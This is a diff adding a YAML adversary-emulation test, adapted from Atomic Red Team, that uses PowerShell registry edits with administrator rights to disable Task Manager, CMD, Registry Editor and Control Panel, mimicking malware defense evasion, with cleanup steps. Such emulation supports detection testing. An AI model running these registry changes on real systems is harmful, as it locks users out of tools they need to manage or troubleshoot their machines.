@@ -1,0 +1,75 @@
+# Adapted from Atomic Red Team - Modify Registry
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
+# Original auto_generated_guids: af254e70-dd0e-4de6-9afe-a994d9ea8b62, d2561a6d-72bd-408c-b150-13efe1801c2a, ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8, a450e469-ba54-4de1-9deb-9023a6111690
+
+---
+api_version: 2.0
+uuid: c79237c6-49d9-4110-bee5-62b54964bcbc
+name: Disable Windows System Tools
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Disable critical Windows administrative and diagnostic tools including Task Manager, CMD, Registry Editor, and Control Panel.
+  Agent Tesla malware and other threats use these techniques to prevent users from managing or troubleshooting the system.
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1112 Modify Registry"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: backup_location_1
+    description: Path where registry backup 1 will be saved
+    type: path
+    default: "C:\\Users\\Public\\backup1.reg"
+  - name: backup_location_2
+    description: Path where registry backup 2 will be saved
+    type: path
+    default: "C:\\Users\\Public\\backup2.reg"
+
+steps:
+  - name: disable_taskmgr
+    executor: powershell
+    inline: |
+      New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableTaskmgr -PropertyType DWord -Value 1 -Force
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableTaskmgr -ErrorAction Ignore
+
+  - name: disable_cmd
+    executor: powershell
+    inline: |
+      New-Item -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Force
+      New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -ErrorAction Ignore
+
+  - name: disable_registry_tool
+    executor: powershell
+    inline: |
+      New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Force
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Name DisableRegistryTools -PropertyType DWord -Value 1 -Force
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Name DisableRegistryTools -ErrorAction Ignore
+
+  - name: activate_nocontrolpanel
+    executor: powershell
+    inline: |
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name NoControlPanel -PropertyType DWord -Value 1 -Force
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name NoControlPanel -ErrorAction Ignore
